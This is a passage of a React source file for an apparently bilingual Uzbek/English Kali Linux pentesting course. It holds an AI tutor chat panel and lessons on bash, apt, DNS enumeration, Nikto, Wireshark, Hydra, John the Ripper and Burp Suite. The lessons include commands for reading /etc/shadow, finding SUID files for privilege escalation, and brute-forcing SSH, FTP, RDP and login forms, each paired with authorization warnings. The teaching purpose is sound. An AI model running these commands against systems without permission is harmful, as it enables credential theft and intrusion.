          React.createElement("div",{style:{fontWeight:600,fontSize:12}},t(lang,"AI Muallim","AI Tutor")),
          React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:8,color:"var(--accent)",letterSpacing:0.5}},"KALI ACADEMY")
        )
      ),
      React.createElement("button",{onClick:onClose,style:{appearance:"none",background:"none",border:"none",cursor:"pointer",color:"var(--text-2)"}},React.createElement(Icon,{name:"x",size:14}))
    ),
    React.createElement("div",{style:{flex:1,overflowY:"auto",padding:"12px 12px 0",minHeight:240}},
      msgs.length===0&&React.createElement("div",{style:{textAlign:"center",padding:"20px 10px",color:"var(--text-3)",fontSize:12}},
        React.createElement("div",{style:{fontSize:28,marginBottom:8}},"🐉"),
        t(lang,"Kali va pentest haqida savol bering!","Ask about Kali & pentesting!"),
        !hasKey()&&React.createElement("div",{style:{marginTop:8,padding:"8px 10px",background:"rgba(255,180,0,0.08)",border:"1px solid rgba(255,180,0,0.25)",borderRadius:8,fontSize:11,color:"var(--c-warn)"}},
          t(lang,"⚠ Profilda AI kalitini o'rnating.","⚠ Set AI key in Profile."))
      ),
      msgs.map((m,i)=>React.createElement("div",{key:i,style:{marginBottom:8,display:"flex",flexDirection:"column",alignItems:m.role==="user"?"flex-end":"flex-start"}},
        React.createElement("div",{style:{maxWidth:"88%",padding:"7px 11px",borderRadius:m.role==="user"?"10px 10px 3px 10px":"10px 10px 10px 3px",background:m.role==="user"?"var(--accent)":m.isErr?"rgba(255,80,80,0.1)":"var(--surface)",border:m.role==="user"?"none":`1px solid ${m.isErr?"rgba(255,80,80,0.3)":"var(--border)"}`,color:m.role==="user"?"#04060d":m.isErr?"#ff6666":"var(--text-0)",fontSize:12,lineHeight:1.6,whiteSpace:"pre-wrap",wordBreak:"break-word"}},m.text)
      )),
      loading&&React.createElement("div",{style:{marginBottom:8}},React.createElement("div",{style:{padding:"7px 12px",borderRadius:"10px 10px 10px 3px",background:"var(--surface)",border:"1px solid var(--border)",fontSize:14,color:"var(--text-3)",letterSpacing:2}},"···")),
      React.createElement("div",{ref:btm,style:{height:12}})
    ),
    React.createElement("div",{style:{padding:"8px 10px",borderTop:"1px solid var(--border)",display:"flex",gap:6}},
      React.createElement("input",{value:inp,onChange:e=>setInp(e.target.value),onKeyDown:e=>{if(e.key==="Enter"&&!e.shiftKey){e.preventDefault();send();}},placeholder:t(lang,"Savol bering…","Ask a question…"),
        style:{flex:1,background:"var(--bg-2)",border:"1px solid var(--border)",borderRadius:7,padding:"7px 10px",color:"var(--text-0)",fontSize:12,outline:"none"}}),
      React.createElement("button",{onClick:send,disabled:!inp.trim()||loading,style:{appearance:"none",border:"none",cursor:inp.trim()&&!loading?"pointer":"not-allowed",width:32,height:32,borderRadius:7,flexShrink:0,background:inp.trim()&&!loading?"var(--accent)":"var(--surface)",color:inp.trim()&&!loading?"#04060d":"var(--text-3)",display:"grid",placeItems:"center"}},
        React.createElement(Icon,{name:"send",size:13}))
    )
  );
}

// ── App Root ──────────────────────────────────────────────────
function App(){
  const [theme,_setTheme]=useState(()=>{try{return localStorage.getItem(THEME_KEY)||"violet";}catch{return"violet";}});
  const setTheme=v=>{_setTheme(v);try{localStorage.setItem(THEME_KEY,v);}catch{}};
  const [lang,_setLang]=useState(()=>{try{return localStorage.getItem(LANG_KEY)||"uz";}catch{return"uz";}});
  const setLang=v=>{_setLang(v);try{localStorage.setItem(LANG_KEY,v);}catch{}};
  const [progress,_setProgress]=useState(loadProgress);
  const updateProgress=useCallback(patch=>{_setProgress(p=>{const n={...p,...patch};saveProgress(n);return n;});},[]);
  const markComplete=useCallback(key=>{_setProgress(p=>{if((p.completedLessons||[]).includes(key))return p;const cl=[...(p.completedLessons||[]),key];const xp=(p.xp||0)+50;const n={...p,completedLessons:cl,xp,level:xpToLevel(xp)};saveProgress(n);return n;});},[]);
  const [route,_setRoute]=useState(()=>{try{const s=localStorage.getItem(ROUTE_KEY);if(s)return JSON.parse(s);}catch{}return"landing";});
  const setRoute=r=>{_setRoute(r);try{localStorage.setItem(ROUTE_KEY,JSON.stringify(r));}catch{};window.scrollTo({top:0,behavior:"instant"});};
  const [profileOpen,setProfileOpen]=useState(false);
  const [aiOpen,setAiOpen]=useState(false);

  useEffect(()=>{
    const th=theme;
    document.documentElement.setAttribute("data-theme",th);
    const colors={violet:"#a855f7",cyan:"#00d4ff",green:"#00ff88"};
    const c=colors[th]||colors.violet;
    const r=document.documentElement.style;
    r.setProperty("--accent",c);
    r.setProperty("--accent-glow",`${c}72`);
    r.setProperty("--accent-soft",`${c}1e`);
    r.setProperty("--accent-border",`${c}47`);
  },[theme]);

  const user={...progress,completedLessons:progress.completedLessons||[]};
  const routeName=typeof route==="string"?route:route?.name;
  const navProps={setRoute,user,setLang,onOpenProfile:()=>setProfileOpen(true),onOpenAI:()=>setAiOpen(true)};

  return React.createElement(LangCtx.Provider,{value:lang},
    React.createElement("div",null,
      routeName!=="landing"&&React.createElement(TopNav,navProps),
      routeName==="landing"?React.createElement(LandingScreen,{setRoute,setLang}):
      routeName==="dashboard"?React.createElement(DashboardScreen,{...navProps}):
      routeName==="section"?React.createElement(SectionScreen,{...navProps,sec:route?.sec||1}):
      routeName==="lesson"?React.createElement(LessonScreen,{...navProps,markComplete,num:route?.num||1}):
      React.createElement(LandingScreen,{setRoute,setLang}),
      profileOpen&&React.createElement(ProfileModal,{user,theme,setTheme,lang,onClose:()=>setProfileOpen(false),onSave:patch=>{updateProgress({name:patch.name});setProfileOpen(false);}}),
      React.createElement(AIChat,{open:aiOpen,onClose:()=>setAiOpen(false),lang})
    )
  );
}


// ── L03: Command line basics ──────────────────────────────────
function LessonL03(){
  const lang=useLang();
  const cmds=[
    {c:"pwd",uz:"Hozirgi joylashuvni (katalogni) ko'rsatadi.",en:"Prints the current working directory."},
    {c:"ls -la",uz:"Barcha fayllarni (yashirin ham) batafsil ro'yxatlaydi.",en:"Lists all files (including hidden) in long format."},
    {c:"cd /etc",uz:"Ko'rsatilgan katalogga o'tadi.",en:"Changes into the given directory."},
    {c:"cp a b",uz:"a faylini b ga nusxalaydi.",en:"Copies file a to b."},
    {c:"mv a b",uz:"a ni b ga ko'chiradi yoki nomini o'zgartiradi.",en:"Moves or renames a to b."},
    {c:"rm -rf dir",uz:"Katalogni ichidagi hamma narsa bilan o'chiradi (ehtiyot bo'ling!).",en:"Deletes a directory and everything in it (be careful!)."},
    {c:"mkdir loot",uz:"Yangi katalog yaratadi.",en:"Creates a new directory."},
    {c:"cat file",uz:"Fayl mazmunini ekranga chiqaradi.",en:"Prints file contents to the screen."},
  ];
  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"Nega buyruq qatori?","Why the command line?")),
    React.createElement(P,null,t(lang,
      "Kali'da ishning 90% terminalda bajariladi. Buyruq qatori (CLI) grafik interfeysdan tezroq, avtomatlashtirishga qulay va masofaviy serverlarda yagona imkoniyat bo'ladi. Pentester uchun bash'ni bilish — asosiy ko'nikma.",
      "About 90% of the work in Kali happens in the terminal. The command line (CLI) is faster than a GUI, easy to automate, and often the only option on remote servers. For a pentester, knowing bash is a core skill."
    )),
    React.createElement(H2,{num:"§2"},t(lang,"Asosiy buyruqlar","Essential commands")),
    cmds.map((x,i)=>React.createElement("div",{key:i,style:{display:"flex",gap:12,marginBottom:8,padding:"11px 14px",background:"var(--surface)",border:"1px solid var(--border)",borderRadius:10,alignItems:"flex-start"}},
      React.createElement("code",{style:{fontFamily:"var(--font-mono)",fontSize:12,fontWeight:700,color:"var(--accent)",minWidth:90}},x.c),
      React.createElement("span",{style:{fontSize:12.5,color:"var(--text-1)",lineHeight:1.55}},t(lang,x.uz,x.en))
    )),
    React.createElement(H2,{num:"§3"},t(lang,"Quvur (pipe) va yo'naltirish","Pipes and redirection")),
    React.createElement(P,null,t(lang,
      "Buyruqlarning kuchi ularni birlashtirishda. Quvur (|) bir buyruq chiqishini boshqasiga uzatadi; > chiqishni faylga yozadi; >> faylga qo'shadi.",
      "The power of commands is in combining them. A pipe (|) sends one command's output into another; > writes output to a file; >> appends to a file."
    )),
    React.createElement(Terminal,null,
      "# Ochiq portlarni sanab, faylga yozish\ncat scan.txt | grep open | wc -l\n\n# Natijani faylga yo'naltirish\nnmap 10.0.0.1 > result.txt\n\n# Foydalanuvchilarni topish\ncat /etc/passwd | grep -v nologin | cut -d: -f1"
    ),
    React.createElement(H2,{num:"§4"},t(lang,"Qidirish: grep va find","Searching: grep and find")),
    React.createElement(Terminal,null,
      "# Matn ichidan qidirish (rekursiv, satr raqami bilan)\ngrep -rn \"password\" /var/www/\n\n# Fayl nomi bo'yicha qidirish\nfind / -name \"*.conf\" 2>/dev/null\n\n# SUID bit o'rnatilgan fayllarni topish (privesc uchun)\nfind / -perm -4000 2>/dev/null"
    ),
    React.createElement(InfoBox,{color:"var(--accent)"},
      React.createElement("strong",null,t(lang,"Maslahat: ","Tip: ")),
      t(lang,"Tab tugmasi buyruq va fayl nomlarini avtomatik to'ldiradi. Yuqoriga strelka oldingi buyruqlarni chaqiradi. history buyrug'i barcha kiritilgan buyruqlarni ko'rsatadi.",
        "The Tab key auto-completes commands and file names. The up arrow recalls previous commands. The history command shows everything you've typed.")
    ),
    React.createElement(Quiz,{
      q:{uz:"Qaysi belgi bir buyruq chiqishini ikkinchi buyruqqa uzatadi?",en:"Which symbol sends one command's output into another command?"},
      opts:[{uz:"> (yo'naltirish)",en:"> (redirect)"},{uz:"| (quvur)",en:"| (pipe)"},{uz:"& (fon)",en:"& (background)"},{uz:"# (izoh)",en:"# (comment)"}],
      correct:1,
      exp:{uz:"Quvur (|) birinchi buyruqning standart chiqishini ikkinchi buyruqning standart kirishiga uzatadi.",en:"The pipe (|) connects the standard output of the first command to the standard input of the second."}
    })
  );
}

// ── L06: apt package management ───────────────────────────────
function LessonL06(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"apt nima?","What is apt?")),
    React.createElement(P,null,t(lang,
      "Kali Debian asosida qurilgani uchun dasturlarni apt (Advanced Package Tool) orqali o'rnatadi. apt paketlarni yuklab olish, o'rnatish, yangilash va o'chirishni, shuningdek bog'liqliklarni (dependencies) avtomatik hal qilishni boshqaradi.",
      "Because Kali is built on Debian, it installs software via apt (Advanced Package Tool). apt handles downloading, installing, upgrading and removing packages, and automatically resolves dependencies."
    )),
    React.createElement(H2,{num:"§2"},t(lang,"Kundalik buyruqlar","Everyday commands")),
    React.createElement(Terminal,null,
      "# Paket ro'yxatini yangilash (har doim avval bajaring)\nsudo apt update\n\n# O'rnatilgan paketlarni yangilash\nsudo apt upgrade -y\n\n# Yangi dastur o'rnatish\nsudo apt install gobuster\n\n# Dasturni o'chirish\nsudo apt remove gobuster\n\n# Dasturni sozlamalari bilan to'liq o'chirish\nsudo apt purge gobuster\n\n# Keraksiz bog'liqliklarni tozalash\nsudo apt autoremove"
    ),
    React.createElement(H2,{num:"§3"},t(lang,"Qidirish va ma'lumot","Searching and info")),
    React.createElement(Terminal,null,
      "# Paketni nomi bo'yicha qidirish\napt search wordlist\n\n# Paket haqida batafsil ma'lumot\napt show nmap\n\n# O'rnatilgan paketlarni ro'yxatlash\napt list --installed | grep hydra"
    ),
    React.createElement(H2,{num:"§4"},t(lang,"Manbalar (sources)","Package sources")),
    React.createElement(P,null,t(lang,
      "apt qayerdan paket olishini /etc/apt/sources.list fayli belgilaydi. Kali uchun faqat rasmiy Kali omborlaridan foydalaning — noma'lum manbalar tizimni xavf ostiga qo'yadi.",
      "Where apt gets packages from is defined in /etc/apt/sources.list. For Kali, use only the official Kali repositories — unknown sources put your system at risk."
    )),
    React.createElement(Terminal,null,
      "# Rasmiy Kali ombori\ndeb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware"
    ),
    React.createElement(InfoBox,{color:"var(--c-warn)"},
      React.createElement("strong",null,"⚠ "),
      t(lang,"apt upgrade dan oldin doim apt update bajaring. Aks holda apt eski ombor ro'yxatidan foydalanadi va yangilanishlarni topa olmaydi.",
        "Always run apt update before apt upgrade. Otherwise apt uses a stale package list and won't find the updates.")
    ),
    React.createElement(Quiz,{
      q:{uz:"O'rnatilgan dasturni sozlama fayllari bilan birga to'liq o'chirish uchun qaysi buyruq ishlatiladi?",en:"Which command fully removes an installed program along with its config files?"},
      opts:[{uz:"apt remove",en:"apt remove"},{uz:"apt purge",en:"apt purge"},{uz:"apt clean",en:"apt clean"},{uz:"apt autoremove",en:"apt autoremove"}],
      correct:1,
      exp:{uz:"apt purge paketni va uning konfiguratsiya fayllarini o'chiradi; apt remove esa faqat paketni o'chirib, sozlamalarni qoldiradi.",en:"apt purge removes the package and its configuration files; apt remove deletes only the package and leaves configs behind."}
    })
  );
}

// ── L14: DNS enumeration ──────────────────────────────────────
function LessonL14(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"DNS enumeratsiya nima uchun?","Why DNS enumeration?")),
    React.createElement(P,null,t(lang,
      "DNS — internetning telefon kitobi. Enumeratsiya jarayonida biz nishon domenning subdomenlarini, pochta serverlarini (MX), nom serverlarini (NS) va IP manzillarini to'playmiz. Bu ma'lumotlar hujum yuzasini (attack surface) kengaytiradi.",
      "DNS is the phone book of the internet. During enumeration we collect a target domain's subdomains, mail servers (MX), name servers (NS) and IP addresses. This information expands the attack surface."
    )),
    React.createElement(H2,{num:"§2"},t(lang,"Asosiy vositalar","Core tools")),
    React.createElement(Terminal,null,
      "# dig — moslashuvchan DNS so'rov vositasi\ndig example.com A\ndig example.com MX\ndig example.com NS\n\n# host — sodda va tez\nhost -t mx example.com\n\n# nslookup — interaktiv rejim ham bor\nnslookup example.com"
    ),
    React.createElement(H2,{num:"§3"},t(lang,"Zona transferi (AXFR)","Zone transfer (AXFR)")),
    React.createElement(P,null,t(lang,
      "Noto'g'ri sozlangan DNS serverlar butun zonani (barcha yozuvlarni) so'ralganda beradi. Bu — jiddiy noto'g'ri konfiguratsiya va pentestda oltin ma'lumot manbasi.",
      "Misconfigured DNS servers hand over the entire zone (all records) on request. This is a serious misconfiguration and a goldmine of information in a pentest."
    )),
    React.createElement(Terminal,null,
      "# Zona transferini sinash\ndig axfr @ns1.example.com example.com\n\n# dnsenum bilan avtomatik\ndnsenum example.com\n\n# dnsrecon bilan (brute-force subdomen)\ndnsrecon -d example.com -t brt -D /usr/share/wordlists/subdomains.txt"
    ),
    React.createElement(InfoBox,{color:"var(--accent)"},
      React.createElement("strong",null,t(lang,"Yozuv turlari: ","Record types: ")),
      t(lang,"A (IPv4), AAAA (IPv6), MX (pochta), NS (nom serveri), CNAME (taxallus), TXT (matn, ko'pincha SPF/DKIM), SOA (zona boshi).",
        "A (IPv4), AAAA (IPv6), MX (mail), NS (name server), CNAME (alias), TXT (text, often SPF/DKIM), SOA (start of authority).")
    ),
    React.createElement(Quiz,{
      q:{uz:"Noto'g'ri sozlangan DNS serverdan butun zona yozuvlarini olish urinishi qanday ataladi?",en:"What is the attempt to pull all zone records from a misconfigured DNS server called?"},
      opts:[{uz:"Zona transferi (AXFR)",en:"Zone transfer (AXFR)"},{uz:"Reverse lookup",en:"Reverse lookup"},{uz:"Cache poisoning",en:"Cache poisoning"},{uz:"DNS tunneling",en:"DNS tunneling"}],
      correct:0,
      exp:{uz:"Zona transferi (AXFR) — bu domenning barcha DNS yozuvlarini bir so'rovda olish; ochiq qolgan AXFR jiddiy zaiflik hisoblanadi.",en:"A zone transfer (AXFR) retrieves all of a domain's DNS records in one request; an open AXFR is a serious vulnerability."}
    })
  );
}

// ── L16: Nikto ────────────────────────────────────────────────
function LessonL16(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"Nikto nima?","What is Nikto?")),
    React.createElement(P,null,t(lang,
      "Nikto — ochiq kodli veb-server skaneri. U 6700+ potentsial xavfli fayl va dasturni, eskirgan server versiyalarini va konfiguratsiya muammolarini tekshiradi. Tez, lekin \"shovqinli\" — IDS/IPS uni oson aniqlaydi.",
      "Nikto is an open-source web server scanner. It checks for 6700+ potentially dangerous files and programs, outdated server versions and configuration issues. It is fast but 'noisy' — IDS/IPS detect it easily."
    )),
    React.createElement(H2,{num:"§2"},t(lang,"Asosiy foydalanish","Basic usage")),
    React.createElement(Terminal,null,
      "# Oddiy skan\nnikto -h http://target.com\n\n# Muayyan portda\nnikto -h target.com -p 8080\n\n# HTTPS bilan\nnikto -h https://target.com -ssl\n\n# Natijani HTML faylga saqlash\nnikto -h target.com -o report.html -Format htm"
    ),
    React.createElement(H2,{num:"§3"},t(lang,"Foydali sozlamalar","Useful options")),
    React.createElement(Terminal,null,
      "# Faqat muayyan sinov turlarini ishga tushirish (Tuning)\n# 1=fayllar, 2=noto'g'ri konfig, 9=SQLi, x=teskari\nnikto -h target.com -Tuning 1234\n\n# Proksi orqali (Burp bilan tahlil uchun)\nnikto -h target.com -useproxy http://127.0.0.1:8080"
    ),
    React.createElement(InfoBox,{color:"var(--c-warn)"},
      React.createElement("strong",null,"⚠ "),
      t(lang,"Nikto faqat sizga tegishli yoki yozma ruxsat berilgan tizimlarda ishlatilishi kerak. Ruxsatsiz skanerlash ko'p mamlakatlarda qonunga zid.",
        "Nikto must only be used on systems you own or have written authorization to test. Unauthorized scanning is illegal in many countries.")
    ),
    React.createElement(Quiz,{
      q:{uz:"Nikto haqida qaysi tavsif to'g'ri?",en:"Which description of Nikto is correct?"},
      opts:[{uz:"Yashirin (stealth) parol buzuvchi",en:"A stealthy password cracker"},{uz:"Shovqinli veb-server zaiflik skaneri",en:"A noisy web server vulnerability scanner"},{uz:"Tarmoq snifferi",en:"A network sniffer"},{uz:"Ekspluatatsiya frameworki",en:"An exploitation framework"}],
      correct:1,
      exp:{uz:"Nikto — veb-serverlardagi ma'lum zaifliklar va noto'g'ri konfiguratsiyalarni tekshiruvchi skaner; u shovqinli, ya'ni himoya tizimlari uni oson aniqlaydi.",en:"Nikto is a scanner that checks web servers for known vulnerabilities and misconfigurations; it is noisy, meaning defenses detect it easily."}
    })
  );
}

// ── L20: Wireshark ────────────────────────────────────────────
function LessonL20(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"Wireshark nima?","What is Wireshark?")),
    React.createElement(P,null,t(lang,
      "Wireshark — dunyodagi eng mashhur tarmoq protokoli analizatori. U tarmoqdan o'tayotgan paketlarni real vaqtda ushlaydi va ularni batafsil, qatlam-qatlam ko'rsatadi. Muammolarni tuzatish, o'rganish va shifrlanmagan ma'lumotlarni tahlil qilish uchun ishlatiladi.",
      "Wireshark is the world's most popular network protocol analyzer. It captures packets crossing the network in real time and displays them in detail, layer by layer. It is used for troubleshooting, learning and analyzing unencrypted data."
    )),
    React.createElement(H2,{num:"§2"},t(lang,"Ushlash va filtrlar","Capture and filters")),
    React.createElement(P,null,t(lang,
      "Wireshark ikki xil filtrga ega: ushlash filtri (capture filter) — nimani yozib olishni cheklaydi; ko'rsatish filtri (display filter) — yozilganidan nimani ko'rsatishni cheklaydi. Ko'rsatish filtrlari ancha kuchli.",
      "Wireshark has two kinds of filters: capture filters limit what gets recorded; display filters limit what is shown from what was recorded. Display filters are far more powerful."
    )),
    React.createElement(Terminal,null,
      "# Keng tarqalgan ko'rsatish filtrlari:\nip.addr == 10.0.0.5          # muayyan IP\ntcp.port == 80               # HTTP trafigi\nhttp                         # faqat HTTP\ndns                          # faqat DNS so'rovlar\ntcp.flags.syn == 1           # SYN paketlar\nhttp.request.method == \"POST\"  # POST so'rovlar"
    ),
    React.createElement(H2,{num:"§3"},t(lang,"Oqimni kuzatish (Follow Stream)","Follow Stream")),
    React.createElement(P,null,t(lang,
      "Paketga o'ng tugma bosib \"Follow > TCP Stream\" ni tanlang — bu bitta ulanishning butun suhbatini bir oynada ko'rsatadi. Shifrlanmagan protokollarda (HTTP, FTP, Telnet) bu login va parollarni ochib berishi mumkin.",
      "Right-click a packet and choose 'Follow > TCP Stream' to see an entire conversation of a single connection in one window. On unencrypted protocols (HTTP, FTP, Telnet) this can reveal logins and passwords."
    )),
    React.createElement(InfoBox,{color:"var(--accent)"},
      React.createElement("strong",null,t(lang,"tshark: ","tshark: ")),
      t(lang,"Wireshark'ning terminal versiyasi. Skriptlar va masofaviy serverlar uchun qulay: tshark -i eth0 -f \"port 80\"",
        "The terminal version of Wireshark. Handy for scripts and remote servers: tshark -i eth0 -f \"port 80\"")
    ),
    React.createElement(Quiz,{
      q:{uz:"Yozib olingan paketlardan faqat kerakligini ko'rsatish uchun qaysi filtr ishlatiladi?",en:"Which filter is used to show only relevant packets from those already captured?"},
      opts:[{uz:"Capture filter (ushlash filtri)",en:"Capture filter"},{uz:"Display filter (ko'rsatish filtri)",en:"Display filter"},{uz:"Firewall qoidasi",en:"Firewall rule"},{uz:"NAT jadvali",en:"NAT table"}],
      correct:1,
      exp:{uz:"Ko'rsatish filtri (display filter) allaqachon ushlangan paketlardan nimani ko'rsatishni belgilaydi va ancha moslashuvchan.",en:"The display filter defines what to show from already-captured packets and is much more flexible."}
    })
  );
}

// ── L24: Hydra ────────────────────────────────────────────────
function LessonL24(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"Hydra nima?","What is Hydra?")),
    React.createElement(P,null,t(lang,
      "Hydra (THC-Hydra) — tezkor va parallel ishlaydigan onlayn parol buzish vositasi. U SSH, FTP, RDP, HTTP forma, SMB va o'nlab boshqa protokollarga qarshi lug'at (dictionary) hujumini amalga oshiradi. \"Onlayn\" degani — u to'g'ridan-to'g'ri jonli xizmatga urinadi.",
      "Hydra (THC-Hydra) is a fast, parallelized online password-cracking tool. It performs dictionary attacks against SSH, FTP, RDP, HTTP forms, SMB and dozens of other protocols. 'Online' means it attacks a live service directly."
    )),
    React.createElement(H2,{num:"§2"},t(lang,"Sintaksis va misollar","Syntax and examples")),
    React.createElement(Terminal,null,
      "# Umumiy shakl:\n# hydra -l USER -P WORDLIST target service\n\n# SSH ga qarshi (bitta foydalanuvchi)\nhydra -l admin -P rockyou.txt ssh://10.0.0.5\n\n# FTP (foydalanuvchilar ro'yxati bilan)\nhydra -L users.txt -P pass.txt ftp://10.0.0.5\n\n# RDP\nhydra -l administrator -P pass.txt rdp://10.0.0.5"
    ),
    React.createElement(H2,{num:"§3"},t(lang,"HTTP forma hujumi","HTTP form attack")),
    React.createElement(P,null,t(lang,
      "Veb login formalari uchun http-post-form modulidan foydalaniladi. Muvaffaqiyatsizlikni bildiruvchi matnni (F=...) ko'rsatish kerak.",
      "For web login forms, use the http-post-form module. You must specify the text that indicates failure (F=...)."
    )),
    React.createElement(Terminal,null,
      "hydra -l admin -P rockyou.txt 10.0.0.5 http-post-form \\\n  \"/login.php:user=^USER^&pass=^PASS^:F=Invalid credentials\""
    ),
    React.createElement(InfoBox,{color:"var(--c-warn)"},
      React.createElement("strong",null,"⚠ "),
      t(lang,"Brute-force hujumlari faqat yozma ruxsat berilgan tizimlarda, masalan CTF yoki shartnomali pentestda o'tkazilishi kerak. Ruxsatsiz urinish jinoyat hisoblanadi va akkauntlarni bloklashi mumkin.",
        "Brute-force attacks must only be run on systems with written authorization, such as CTFs or contracted pentests. Unauthorized attempts are a crime and can lock out accounts.")
    ),
    React.createElement(Quiz,{
      q:{uz:"Hydra qanday turdagi parol hujumini amalga oshiradi?",en:"What type of password attack does Hydra perform?"},
      opts:[{uz:"Oflayn hash buzish",en:"Offline hash cracking"},{uz:"Onlayn (jonli xizmatga) lug'at hujumi",en:"Online (against a live service) dictionary attack"},{uz:"Rainbow table",en:"Rainbow table lookup"},{uz:"Phishing",en:"Phishing"}],
      correct:1,
      exp:{uz:"Hydra onlayn hujum vositasi — u parollarni to'g'ridan-to'g'ri jonli xizmatga (SSH, FTP va h.k.) urinib sinaydi. Hashni oflayn buzish uchun John yoki Hashcat ishlatiladi.",en:"Hydra is an online attack tool — it tries passwords directly against a live service (SSH, FTP, etc.). For offline hash cracking you use John or Hashcat."}
    })
  );
}

// ── L25: John the Ripper ──────────────────────────────────────
function LessonL25(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"John the Ripper nima?","What is John the Ripper?")),
    React.createElement(P,null,t(lang,
      "John the Ripper (JtR) — mashhur oflayn parol hash buzish vositasi. \"Oflayn\" degani — u sizda mavjud hashlar bilan ishlaydi va nishon tizimga ulanmaydi. U yuzlab hash turlarini (MD5, SHA, NTLM, bcrypt va h.k.) qo'llab-quvvatlaydi.",
      "John the Ripper (JtR) is a popular offline password-hash cracker. 'Offline' means it works on hashes you already have and never touches the target system. It supports hundreds of hash types (MD5, SHA, NTLM, bcrypt, etc.)."
    )),
    React.createElement(H2,{num:"§2"},t(lang,"Ish jarayoni","Workflow")),
    React.createElement(Terminal,null,
      "# 1. Linux hashlarini birlashtirish (root kerak)\nunshadow /etc/passwd /etc/shadow > hashes.txt\n\n# 2. Lug'at rejimida buzish\njohn --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\n\n# 3. Buzilgan parollarni ko'rish\njohn --show hashes.txt"
    ),
    React.createElement(H2,{num:"§3"},t(lang,"Rejimlar va formatlar","Modes and formats")),
    React.createElement(Terminal,null,
      "# Hash turini aniq ko'rsatish\njohn --format=raw-md5 hashes.txt\n\n# Incremental (brute-force) rejim\njohn --incremental hashes.txt\n\n# Qoidalar bilan (parollarni o'zgartirish)\njohn --wordlist=rockyou.txt --rules hashes.txt"
    ),
    React.createElement(InfoBox,{color:"var(--accent)"},
      React.createElement("strong",null,t(lang,"John vs Hashcat: ","John vs Hashcat: ")),
      t(lang,"John CPU'da moslashuvchan va formatlarni avtomatik aniqlaydi; Hashcat esa GPU tezligida ancha tez ishlaydi. Katta hajmdagi ishlar uchun Hashcat afzal.",
        "John is flexible on the CPU and auto-detects formats; Hashcat runs much faster at GPU speed. For large jobs Hashcat is preferred.")
    ),
    React.createElement(Quiz,{
      q:{uz:"John the Ripper \"oflayn\" vosita deganda nima nazarda tutiladi?",en:"What does it mean that John the Ripper is an 'offline' tool?"},
      opts:[{uz:"Internet talab qilmaydi",en:"It requires no internet"},{uz:"U nishon tizimga ulanmasdan, mavjud hashlarni buzadi",en:"It cracks existing hashes without connecting to the target"},{uz:"Faqat kechasi ishlaydi",en:"It only runs at night"},{uz:"Faqat Windows'da ishlaydi",en:"It only runs on Windows"}],
      correct:1,
      exp:{uz:"Oflayn buzish — bu qo'lga kiritilgan hashlarni mahalliy ravishda, nishon xizmatiga hech qanday so'rov yubormasdan sindirish.",en:"Offline cracking means breaking captured hashes locally, sending no requests to the target service."}
    })
  );
}

// ── L27: Burp Suite ───────────────────────────────────────────
function LessonL27(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"Burp Suite nima?","What is Burp Suite?")),
    React.createElement(P,null,t(lang,
      "Burp Suite — veb-ilovalarni test qilishning sanoat standarti. U brauzer va server o'rtasida proksi sifatida o'tirib, HTTP so'rovlarni ushlash, o'zgartirish va qayta yuborish imkonini beradi. Kali'da Community versiyasi oldindan o'rnatilgan.",
      "Burp Suite is the industry standard for testing web applications. It sits as a proxy between the browser and server, letting you intercept, modify and replay HTTP requests. The Community edition comes pre-installed on Kali."
    )),
    React.createElement(H2,{num:"§2"},t(lang,"Asosiy komponentlar","Core components")),
    React.createElement("div",{style:{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(200px,1fr))",gap:10,margin:"12px 0 18px"}},
      [["Proxy",t(lang,"So'rovlarni ushlab o'zgartirish","Intercept & modify requests")],
       ["Repeater",t(lang,"So'rovni qo'lda qayta yuborish","Manually resend a request")],
       ["Intruder",t(lang,"Avtomatlashtirilgan fuzzing/brute","Automated fuzzing / brute force")],
       ["Decoder",t(lang,"Kodlash/dekodlash (base64, URL)","Encode/decode (base64, URL)")]].map((x,i)=>
        React.createElement("div",{key:i,style:{background:"var(--surface)",border:"1px solid var(--border)",borderRadius:10,padding:"12px 14px"}},
          React.createElement("div",{style:{fontWeight:700,fontSize:13,color:"var(--accent)",marginBottom:4}},x[0]),
          React.createElement("div",{style:{fontSize:12,color:"var(--text-2)",lineHeight:1.5}},x[1])))
    ),
    React.createElement(H2,{num:"§3"},t(lang,"Proksi sozlash","Setting up the proxy")),
    React.createElement(Terminal,null,
      "# 1. Burp'da: Proxy > Intercept > Intercept is ON\n# 2. Brauzer proksi: 127.0.0.1:8080\n# 3. Burp CA sertifikatini o'rnatish:\n#    http://burp > Download CA Certificate\n#    Brauzer > Certificates > Import\n\n# FoxyProxy (brauzer kengaytmasi) almashtirishni osonlashtiradi"
    ),
    React.createElement(H2,{num:"§4"},t(lang,"Repeater bilan test","Testing with Repeater")),
    React.createElement(P,null,t(lang,
      "So'rovni ushlaganingizdan so'ng, unga o'ng tugma bosib \"Send to Repeater\" ni tanlang (yoki Ctrl+R). Repeater'da so'rovni istalgancha o'zgartirib qayta yuborishingiz va javobni tahlil qilishingiz mumkin — SQLi, XSS va boshqa zaifliklarni sinash uchun ideal.",
      "After intercepting a request, right-click it and choose 'Send to Repeater' (or Ctrl+R). In Repeater you can modify and resend the request as many times as you like and analyze the response — ideal for testing SQLi, XSS and other vulnerabilities."
    )),
    React.createElement(InfoBox,{color:"var(--c-warn)"},
      React.createElement("strong",null,"⚠ "),
      t(lang,"Burp Suite'ni faqat sizga tegishli yoki test qilishga ruxsat berilgan veb-ilovalarda ishlating. PortSwigger'ning Web Security Academy'sida bepul amaliy laboratoriyalar mavjud.",
        "Only use Burp Suite on web apps you own or are authorized to test. PortSwigger's Web Security Academy offers free hands-on labs.")
    ),
    React.createElement(Quiz,{
